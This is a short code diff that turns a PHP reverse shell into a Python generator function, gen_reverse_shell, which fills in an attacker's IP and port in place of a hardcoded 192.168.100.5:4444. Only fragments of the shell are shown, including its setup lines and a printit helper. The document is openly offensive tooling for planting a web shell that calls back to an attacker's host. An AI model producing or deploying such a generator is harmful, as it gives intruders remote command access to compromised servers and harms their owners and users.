@@ -1,11 +1,14 @@
-
+def gen_reverse_shell(attacker_info):
+	start = '''
 	<?php
 
 	set_time_limit (0);
 	$VERSION = "1.0";
-	$ip = '192.168.100.5';
-	$port = 4444; 
-	
+	$ip = '{ip}';
+	$port = {port}; 
+	'''.format(ip = attacker_info["ip"], port = int(attacker_info["port"])) 
+
+	end = '''
 	$chunk_size = 1400;
 	$write_a = null;
 	$error_a = null;
@@ -109,11 +112,12 @@
 
 	function printit ($string) {
 		if (!$daemon) {
-			print "$string
-";
+			print "$string\n";
 		}
 	}
 
 	?>
 
+	'''
+	return ( start + end )
 	
